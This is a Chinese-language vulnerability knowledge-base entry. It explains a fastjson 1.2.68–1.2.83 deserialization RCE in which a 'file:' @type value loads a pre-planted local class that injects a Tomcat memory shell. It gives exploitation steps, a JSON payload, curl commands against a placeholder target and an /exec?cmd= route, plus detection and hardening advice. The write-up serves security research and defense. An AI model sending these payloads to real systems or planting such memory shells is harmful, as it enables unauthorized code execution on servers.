---
id: web-java-deser-fastjson-file-protocol-no-egress-rce
title: 'fastjson 1.2.83 file: 协议不出网加载本地 class RCE'
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-file-protocol-no-egress-rce
tags:
- java
- fastjson
- deserialization
- autotype
- file-protocol
- no-egress
- classloader
- tomcat
- memshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: fastjson 1.2.68 ~ 1.2.83（原文实测 1.2.83）
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:37:54+08:00'
  notes: 已对照原文与2张图核对；资源探测替换点号/LaunchedURLClassLoader 读 file:/JSONType 绕过 autoTypeSupport/defineClass 触发 clinit/内存马回显均一致，受影响区间原文明确；PoC 已打通（/exec?cmd=id 回显），未本地复现
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-file-protocol-no-egress-rce/
draft: false
kb_aliases:
- fastjson file 协议 RCE
- fastjson 不出网 file
- 本地 class 加载
- JSONType 资源探测 file
---

## 一句话结论

当目标不出网、但攻击者已能让一个恶意 `.class` 落到目标磁盘时，fastjson 1.2.68~1.2.83 的 `@type` 资源探测会把 `file:.tmp.MemShell` 拼成 `file:/tmp/MemShell.class` 并交给 `LaunchedURLClassLoader` 读取；class 上的 `@JSONType` 注解使其在 AutoType 关闭时也被视为可信类型，随后 `defineClass` 与 `<clinit>` 执行，完成完全不出网的 RCE 与内存马注入。

## 原理

- `checkAutoType` 在 SafeMode 关闭时，会先做资源探测：`resource = typeName.replace('.', '/') + ".class"`，再调用 `defaultClassLoader.getResourceAsStream(resource)` 读取字节码。
- 把 `@type` 写成 `file:.tmp.MemShell`，点号被替换后得到 `file:/tmp/MemShell.class`；Spring Boot 的 `LaunchedURLClassLoader` 会把 `file:` URL 当作本地文件读取，全程没有网络请求。
- `ClassReader` 扫描字节码时发现 `@com.alibaba.fastjson.annotation.JSONType` 注解，置 `jsonType=true`；后续判断 `if (autoTypeSupport || jsonType || expectClassFlag)` 因此放行，即使 `autoTypeSupport=false` 也绕过。
- `TypeUtils.loadClass()` 通过类加载器 `defineClass` 加载该类，触发 `<clinit>`。攻击者把所有逻辑放在静态初始化中：Base64 解码 Valve/Injector 字节码、`defineClass`、把 Valve 注入 Tomcat Pipeline。
- 注入完成后，攻击者访问 `GET /exec?cmd=xxx` 即可在 Tomcat 进程内执行命令并回显。
- 根因与远程资源探测一致：检查的字符串和最终加载的类来自同一个攻击者可控输入，`@JSONType` 让不可信 class 自证可信；区别只是本路径用 `file:` 指向本地已落盘的 class，因此不需要出网。

## 触发条件

- fastjson 1.2.68 ~ 1.2.83，`SafeMode=false`（默认）。
- 应用把不可信 JSON 交给 `JSON.parse`/`parseObject`，`@type` 生效。
- 类加载器能解析 `file:` URL（典型为 Spring Boot FatJar 的 `LaunchedURLClassLoader`）。
- **恶意 class 文件已预先写入目标磁盘**：通过文件上传、路径穿越、日志写马、临时文件等任意写入原语落地。
- 路径可预测或可控（如 `/tmp/MemShell.class`），且目标进程对该文件有读权限。
- AutoType 开或关均可，关闭不能免疫；SafeMode=true 可在入口阻断。

## 利用步骤

1. 确认 fastjson 版本、SafeMode 状态、解析入口与类加载器类型（是否 Spring Boot FatJar）。
2. 用 ASM/生成工具构造恶意 class：this_class 为普通类名（但文件路径可控），带 `@JSONType` 注解，`<clinit>` 中 Base64 解码内存马字节码并 `defineClass`，再注入 Tomcat Valve/Filter。
3. 通过文件上传、路径穿越、日志写入等把 class 写到目标磁盘可预测路径，如 `/tmp/MemShell.class`。
4. 发送 `{"@type":"file:.tmp.MemShell","x":1}`；点号替换后指向 `/tmp/MemShell.class`。
5. 观察响应中出现类名/实例，说明加载成功；随后访问内存马路由（如 `/exec?cmd=id`）验证命令执行。
6. 若路径不可预测，先通过上传/日志等原语确定落盘路径，再按其构造 `@type`。

## PoC

```json
{"@type":"file:.tmp.MemShell","x":1}
```

对应资源路径：

```text
file:.tmp.MemShell  --replace('.','/')--> file:/tmp/MemShell.class
```

```bash
# 发送 payload（不出网，-x 仅用于观察，不是必需）
curl -X POST http://TARGET:18080/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"file:.tmp.MemShell","x":1}'

# 靶场返回示例
# {"ok":true,"class":"file:.tmp.MemShell","result":"file:.tmp.MemShell@21e90e88"}

# 验证内存马命令执行
curl 'http://TARGET:18080/exec?cmd=id'
```

恶意 class 的静态初始化语义（实际字节码由生成器产出）：

```java
@JSONType
public class MemShell {
    static {
        // Base64 解码 Valve/Injector 字节码 -> defineClass -> 注入 Tomcat Pipeline
    }
}
```

## 变体与关联

- 与 `jar:http:` 路径对比：`jar:http` 需要出网，JDK 8 可 `defineClass` 完成 RCE，JDK 9+ 可能因 `ClassFormatError` 降级为 SSRF；`file:` 路径不需要出网，但要求 class 预先落盘。
- 落盘方式：文件上传、路径穿越、日志注入、临时文件、备份/解压等；只要路径可预测且进程可读即可。
- `file:` 可指向任意可读 class 路径，不限于 `/tmp`；路径中的点号会被替换为斜杠，构造时需反向编码。
- 与 `jar:file:` + `/proc/self/fd` 的区别：fd 路径无需预先知道文件名，但要维持未完成 multipart 与 fd；本路径需要预落盘但无需 fd 碰撞。
- 关联：`[[web-java-deser-fastjson-resource-probing-rce]]` 是同一资源探测机制的网络版；`[[web-java-deser-fastjson-fd-jar-no-egress-rce]]` 是 `jar:file` + fd 的不出网变体；`[[web-java-classloader-jsp-memory-servlet-webshell]]` 是内存马落地形态。

## 检测与防御

- 请求检测：`@type` 值中出现 `file:`、`file:.`、`.class`、`@JSONType` 相关特征；与 `jar:`、`http:` 一并拦截。
- 文件检测：Web 可写目录、临时目录、上传目录出现 `.class` 文件；Tomcat 工作目录出现异常 class/Valve 注入痕迹。
- 运行时检测：应用进程 `defineClass` 加载非 classpath 路径；Tomcat Pipeline 中出现未知 Valve；访问 `/exec` 等异常路由。
- 修复：升级 fastjson 到修复版本；开启 SafeMode（`-Dfastjson.parser.safeMode=true`），其检查发生在资源探测之前。
- 加固：不要把不可信输入交给 fastjson；关闭不必要的文件上传/写入原语，限制 Web 进程对临时目录的写权限；出网过滤不能防住本路径，必须同时修补 fastjson 与文件写入面。
